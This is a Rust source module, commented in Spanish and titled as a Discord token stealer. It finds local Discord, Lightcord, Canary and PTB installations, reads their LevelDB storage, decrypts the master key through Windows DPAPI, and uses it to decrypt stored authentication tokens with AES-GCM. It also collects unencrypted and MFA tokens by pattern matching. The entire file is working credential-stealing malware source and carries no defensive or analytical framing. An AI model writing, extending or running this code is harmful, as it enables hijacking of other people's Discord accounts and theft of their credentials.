// Stealer de tokens de Discord
use crate::stealer::{StealerError, StealerResult};
use crate::stealer::common::{get_appdata_roaming, file_exists};
use std::path::PathBuf;
use std::fs;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};

/// Estructura para un token de Discord robado
#[derive(Debug, Clone)]
pub struct DiscordToken {
    pub token: String,
    pub source: String,  // Discord, Lightcord, Canary, PTB
}

impl DiscordToken {
    pub fn to_string(&self) -> String {
        format!("[{}] {}", self.source, self.token)
    }
}

/// Roba tokens de todas las versiones de Discord
pub fn steal_discord_tokens() -> StealerResult<Vec<DiscordToken>> {
    let appdata = get_appdata_roaming().ok_or(StealerError::BrowserNotFound)?;
    
    let discord_paths = vec![
        (appdata.join("Discord"), "Discord"),
        (appdata.join("Lightcord"), "Lightcord"),
        (appdata.join("discordcanary"), "Discord Canary"),
        (appdata.join("discordptb"), "Discord PTB"),
    ];
    
    let mut all_tokens = Vec::new();
    
    for (path, source) in discord_paths {
        if let Ok(mut tokens) = extract_discord_tokens(&path, source) {
            all_tokens.append(&mut tokens);
        }
    }
    
    if all_tokens.is_empty() {
        Err(StealerError::BrowserNotFound)
    } else {
        Ok(all_tokens)
    }
}

/// Extrae tokens de una instalación específica de Discord
fn extract_discord_tokens(discord_path: &PathBuf, source: &str) -> StealerResult<Vec<DiscordToken>> {
    let leveldb_path = discord_path.join("Local Storage").join("leveldb");
    
    if !leveldb_path.exists() {
        return Err(StealerError::BrowserNotFound);
    }
    
    // Leer Local State para obtener la encryption key
    let local_state_path = discord_path.join("Local State");
    let master_key = if file_exists(&local_state_path) {
        extract_master_key(&local_state_path)?
    } else {
        None
    };
    
    let mut tokens = Vec::new();
    
    // Buscar tokens en archivos .log y .ldb
    if let Ok(entries) = fs::read_dir(&leveldb_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            let filename = path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("");
            
            if filename.ends_with(".log") || filename.ends_with(".ldb") {
                if let Ok(content) = fs::read_to_string(&path) {
                    // Buscar tokens encrypted con el formato dQw4w9WgXcQ:
                    for line in content.lines() {
                        if let Some(encrypted) = extract_encrypted_token(line) {
                            if let Some(key) = &master_key {
                                if let Ok(token) = decrypt_discord_token(&encrypted, key) {
                                    if is_valid_token_format(&token) {
                                        tokens.push(DiscordToken {
                                            token: token.clone(),
                                            source: source.to_string(),
                                        });
                                    }
                                }
                            }
                        }
                        
                        // También buscar tokens no encriptados (formato antiguo)
                        if let Some(token) = extract_unencrypted_token(line) {
                            if is_valid_token_format(&token) {
                                tokens.push(DiscordToken {
                                    token: token.clone(),
                                    source: source.to_string(),
                                });
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Deduplicar tokens
    tokens.sort_by(|a, b| a.token.cmp(&b.token));
    tokens.dedup_by(|a, b| a.token == b.token);
    
    Ok(tokens)
}

/// Extrae la master key del archivo Local State
fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8>>> {
    let content = fs::read_to_string(local_state_path)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    if let Some(start) = content.find("\"encrypted_key\":\"") {
        let start_idx = start + 17;
        if let Some(end) = content[start_idx..].find("\"") {
            let base64_key = &content[start_idx..start_idx + end];
            
            let encrypted_key = base64_decode_simple(base64_key)
                .map_err(|_| StealerError::Base64Error)?;
            
            if encrypted_key.len() > 5 && &encrypted_key[0..5] == b"DPAPI" {
                let _encrypted_without_prefix = &encrypted_key[5..];
                
                #[cfg(target_os = "windows")]
                {
                    let decrypted = dpapi_decrypt(&encrypted_key[5..])?;
                    return Ok(Some(decrypted));
                }
                
                #[cfg(not(target_os = "windows"))]
                return Err(StealerError::DecryptionFailed);
            }
        }
    }
    
    Ok(None)
}

/// Desencripta usando Windows DPAPI
#[cfg(target_os = "windows")]
fn dpapi_decrypt(data: &[u8]) -> StealerResult<Vec<u8>> {
    use winapi::um::dpapi::CryptUnprotectData;
    use winapi::um::wincrypt::DATA_BLOB;
    use std::ptr;
    
    let mut data_in = DATA_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };

    let mut data_out: DATA_BLOB = unsafe { std::mem::zeroed() };

    let result = unsafe {
        CryptUnprotectData(
            &mut data_in,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut data_out,
        )
    };

    if result == 0 {
        return Err(StealerError::DecryptionFailed);
    }

    let size = data_out.cbData as usize;
    let decrypted = unsafe {
        std::slice::from_raw_parts(data_out.pbData, size).to_vec()
    };

    Ok(decrypted)
}

/// Extrae token encriptado de una línea (formato dQw4w9WgXcQ:...)
fn extract_encrypted_token(line: &str) -> Option<String> {
    if let Some(start) = line.find("dQw4w9WgXcQ:") {
        let start_idx = start + 12;
        let remaining = &line[start_idx..];
        
        // Extraer hasta el siguiente delimitador (", espacio, etc.)
        let end = remaining.find(|c: char| c == '"' || c == ' ' || c == '\n')
            .unwrap_or(remaining.len());
        
        if end > 0 {
            return Some(remaining[..end].to_string());
        }
    }
    None
}

/// Extrae token no encriptado (formato antiguo)
fn extract_unencrypted_token(line: &str) -> Option<String> {
    // Regex patterns para tokens de Discord:
    // - Standard: [\w-]{24}\.[\w-]{6}\.[\w-]{25,110}
    // - MFA: mfa\.[\w-]{80,95}
    
    // Implementación simple sin regex (para evitar dependencia)
    let words: Vec<&str> = line.split(|c: char| !c.is_alphanumeric() && c != '-' && c != '.').collect();
    
    for word in words {
        if word.len() >= 50 && word.contains('.') {
            let parts: Vec<&str> = word.split('.').collect();
            
            // MFA token: mfa.{84 chars}
            if parts.len() == 2 && parts[0] == "mfa" && parts[1].len() >= 80 && parts[1].len() <= 95 {
                return Some(word.to_string());
            }
            
            // Standard token: {24}.{6}.{27+}
            if parts.len() == 3 {
                if parts[0].len() == 24 && parts[1].len() == 6 && parts[2].len() >= 25 && parts[2].len() <= 110 {
                    return Some(word.to_string());
                }
            }
        }
    }
    
    None
}

/// Desencripta un token de Discord encriptado
fn decrypt_discord_token(encrypted_b64: &str, master_key: &[u8]) -> StealerResult<String> {
    // Decodificar Base64
    let encrypted = base64_decode_simple(encrypted_b64)
        .map_err(|_| StealerError::Base64Error)?;
    
    if encrypted.len() < 3 + 12 + 16 {
        return Err(StealerError::InvalidData);
    }
    
    // Discord usa el mismo formato que Chromium v10
    if &encrypted[0..3] != b"v10" && &encrypted[0..3] != b"v11" {
        return Err(StealerError::InvalidData);
    }
    
    let nonce_bytes = &encrypted[3..15];
    let ciphertext_with_tag = &encrypted[15..];
    
    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|_| StealerError::DecryptionFailed)?;
    
    let nonce = Nonce::clone_from_slice(nonce_bytes);
    
    let plaintext = cipher.decrypt(&nonce, ciphertext_with_tag)
        .map_err(|_| StealerError::DecryptionFailed)?;
    
    String::from_utf8(plaintext)
        .map_err(|_| StealerError::InvalidData)
}

/// Valida el formato de un token de Discord
fn is_valid_token_format(token: &str) -> bool {
    if token.len() < 50 {
        return false;
    }
    
    if token.starts_with("mfa.") {
        return token.len() >= 84 && token.len() <= 100;
    }
    
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return false;
    }
    
    parts[0].len() == 24 && parts[1].len() == 6 && parts[2].len() >= 25 && parts[2].len() <= 110
}

/// Decodificador Base64 simple
fn base64_decode_simple(input: &str) -> Result<Vec<u8>, ()> {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    let mut result = Vec::new();
    let input_bytes: Vec<u8> = input.bytes()
        .filter(|&b| b != b'=' && !b.is_ascii_whitespace())
        .collect();
    
    for chunk in input_bytes.chunks(4) {
        let mut buf = [0u8; 4];
        
        for (i, &byte) in chunk.iter().enumerate() {
            match CHARS.iter().position(|&c| c == byte) {
                Some(pos) => buf[i] = pos as u8,
                None => return Err(()),
            }
        }
        
        result.push((buf[0] << 2) | (buf[1] >> 4));
        
        if chunk.len() > 2 {
            result.push((buf[1] << 4) | (buf[2] >> 2));
        }
        
        if chunk.len() > 3 {
            result.push((buf[2] << 6) | buf[3]);
        }
    }
    
    Ok(result)
}
